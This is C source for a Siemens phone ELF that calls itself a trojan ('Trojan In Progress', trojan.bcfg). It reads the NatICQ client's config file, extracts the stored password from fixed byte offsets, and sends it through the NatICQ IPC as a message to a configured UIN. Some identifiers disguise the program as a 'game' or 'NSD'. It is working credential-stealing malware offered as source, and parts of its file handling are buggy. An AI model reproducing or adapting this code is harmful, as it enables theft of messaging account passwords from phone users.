#include "..\inc\swilib.h"
#include "conf_loader.h"
#include "../inc/xtask_ipc.h"

const char ipc_my_name[]="game";
const char ipc_send_name[]="NatICQ";
const char percent_d[]="%d";
extern const unsigned int UIN;
#define IPC_SENDMSG 5

typedef struct{
  unsigned long uin;
  char *msg;
}IPCssg;

typedef struct
{
  IPCssg IPCMsg;
  char data[16384];
}TPKT;

IPC_REQ tmr_gipc;
char pass[16];
//int maincsm_id;

void process()
{
//  InitConfig();
  if(UIN>0)
  {
  int f;
  int fsize;
  unsigned int ul;
  FSTATS stat;
  GetFileStats("4:\\zbin\\etc\\naticq.bcfg",&stat,&ul);
  if(stat.size>0)
  {
  f=fopen("4:\\zbin\\etc\\naticq.bcfg",A_ReadOnly+A_BIN,P_READ,&ul);
  fsize=stat.size;
  }
  char *p=malloc(fsize);
  p[fread(f,p,fsize,&ul)];
  fclose(f,&ul);
  int k=92;
  int i=0;
  while(k<100)
  {
    pass[i]=p[k];
    i++;
    k++;
  }
  pass[i]='\0';
  sprintf((char *)ipc_send_name+6,percent_d,UIN);
  tmr_gipc.name_to=ipc_send_name;
  tmr_gipc.name_from=ipc_my_name;
  TPKT *send=malloc(sizeof(IPCssg)+30);
  send->IPCMsg.uin=UIN;
  send->IPCMsg.msg=pass;
  tmr_gipc.data=send;
  GBS_SendMessage(MMI_CEPID,MSG_IPC,IPC_SENDMSG,&tmr_gipc);
  }
  else 
  { 
    WSHDR *ws=AllocWS(150);
    wsprintf(ws, "4:\\zbin\\etc\\trojan.bcfg");
    ExecuteFile(ws,0,0);
    mfree(ws);
    ShowMSG(1,(int)"Set your UIN in trojan.bcfg");
//    CloseCSM(maincsm_id);
  }
}

const int minus11=-11;

typedef struct
{
  CSM_RAM csm;
}MAIN_CSM;

CSM_RAM *under_idle;

extern void kill_data(void *p, void (*func_p)(void *));

#pragma inline=forced

int toupper(int c)
{
  if ((c>='a')&&(c<='z')) c+='A'-'a';
  return(c);
}

int strcmp_nocase(const char *s1,const char *s2)
{
  int i;
  int c;
  while(!(i=(c=toupper(*s1++))-toupper(*s2++))) if (!c) break;
  return(i);
}
/*
const char ipc_my_name[]="reciever";
const char ipc_send_name[]="sender";
#define IPC_TEST 7
char test[48];

typedef struct{
//  unsigned long uin;
  char *msg;
}IPCMsg;
*/
int maincsm_onmessage(CSM_RAM* data,GBS_MSG* msg)
{
  if(msg->msg == MSG_RECONFIGURE_REQ) 
  {
    extern const char *successed_config_filename;
    if (strcmp_nocase(successed_config_filename,(char *)msg->data0)==0)
    {
      ShowMSG(1,(int)"NSD config updated!");
      InitConfig();
    }
  }
  /*
  if (msg->msg==MSG_IPC)
    {
      IPC_REQ *ipc;
      if ((ipc=(IPC_REQ*)msg->data0))
      {
	if (strcmp_nocase(ipc->name_to,ipc_my_name)==0)
	{
	  switch (msg->submess)
	  {
	  case IPC_TEST:
            {
            int l=strlen(ipc->data);
            memcpy(test,ipc->data,l);
            ShowMSG(1,(int)test);
            }
	    break;
          }
        }
      }
    }
  */
  return (1);  
}

static void maincsm_oncreate(CSM_RAM *data)
{
//  maincsm_id=CreateCSM(&MAINCSM.maincsm,&main_csm,0);
}

static void Killer(void)
{
  extern void *ELF_BEGIN;
  kill_data(&ELF_BEGIN,(void (*)(void *))mfree_adr());
}

static void maincsm_onclose(CSM_RAM *csm)
{
  SUBPROC((void *)Killer);
}

static unsigned short maincsm_name_body[140];

static const struct
{
  CSM_DESC maincsm;
  WSHDR maincsm_name;
}MAINCSM =
{
  {
  maincsm_onmessage,
  maincsm_oncreate,
#ifdef NEWSGOLD
  0,
  0,
  0,
  0,
#endif
  maincsm_onclose,
  sizeof(MAIN_CSM),
  1,
  &minus11
  },
  {
    maincsm_name_body,
    NAMECSM_MAGIC1,
    NAMECSM_MAGIC2,
    0x0,
    139
  }
};

static void UpdateCSMname(void)
{
  wsprintf((WSHDR *)(&MAINCSM.maincsm_name),"Trojan In Progress");
}

int main()
{
  InitConfig();
  CSM_RAM *save_cmpc;
  char dummy[sizeof(MAIN_CSM)];
  UpdateCSMname();  
  LockSched();
  save_cmpc=CSM_root()->csm_q->current_msg_processing_csm;
  CSM_root()->csm_q->current_msg_processing_csm=CSM_root()->csm_q->csm.first;
  CreateCSM(&MAINCSM.maincsm,dummy,0);
  CSM_root()->csm_q->current_msg_processing_csm=save_cmpc;
  UnlockSched();
  process();
//  extern const int ENA_HELLO_MSG;
//  if (ENA_HELLO_MSG) ShowMSG(1,(int)"NSD установлен!");  
  return 0;
}
